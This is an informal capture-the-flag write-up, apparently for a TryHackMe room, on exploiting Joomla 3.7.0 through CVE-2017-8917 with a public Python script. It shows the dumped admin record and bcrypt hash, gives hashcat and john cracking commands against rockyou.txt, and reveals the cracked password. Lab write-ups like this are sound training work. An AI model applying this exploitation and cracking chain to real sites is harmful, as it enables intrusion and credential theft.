we search for exploits for joomla 3.7.0 and find:
CVE-2017-8917

The room hint says to not use SQLmap and to use python instead.

We find this python script:
https://github.com/NinjaJc01/joomblah-3

we find a password hash:

`$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`

and usernames:

`(' [$] Found user', ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''])`



```bash
sed -n '45000,50000p' /usr/share/wordlists/rockyou.txt | hashcat -m3200 -a0 --force 'hash.txt'
```


sed -n '45000,50000p' /usr/share/wordlists/rockyou.txt | john --stdin --format=bcrypt hash.txt

We finally got the fuckin password it's `spiderman123`